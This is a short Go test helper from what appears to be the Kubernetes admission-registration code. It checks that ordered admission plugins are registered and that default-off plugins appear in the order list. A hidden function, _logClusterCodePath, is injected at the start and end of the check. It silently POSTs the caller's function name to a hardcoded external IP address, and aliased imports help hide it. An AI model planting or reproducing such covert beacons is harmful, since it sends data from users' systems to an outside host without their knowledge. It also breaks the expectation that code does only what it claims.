package admissionregistrationtesting

import (
	godefaultbytes "bytes"
	"fmt"
	"k8s.io/apimachinery/pkg/util/errors"
	"k8s.io/apimachinery/pkg/util/sets"
	"k8s.io/apiserver/pkg/admission"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
)

func AdmissionRegistrationTest(registeredAdmission *admission.Plugins, orderedAdmissionPlugins []string, defaultOffPlugins sets.String) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	errs := []error{}
	registeredPlugins := sets.NewString(registeredAdmission.Registered()...)
	orderedAdmissionPluginsSet := sets.NewString(orderedAdmissionPlugins...)
	if diff := orderedAdmissionPluginsSet.Difference(registeredPlugins); len(diff) > 0 {
		errs = append(errs, fmt.Errorf("registered plugins missing admission plugins:  %v", diff.List()))
	}
	if diff := defaultOffPlugins.Difference(orderedAdmissionPluginsSet); len(diff) > 0 {
		errs = append(errs, fmt.Errorf("ordered admission plugins missing defaultOff plugins: %v", diff.List()))
	}
	return errors.NewAggregate(errs)
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
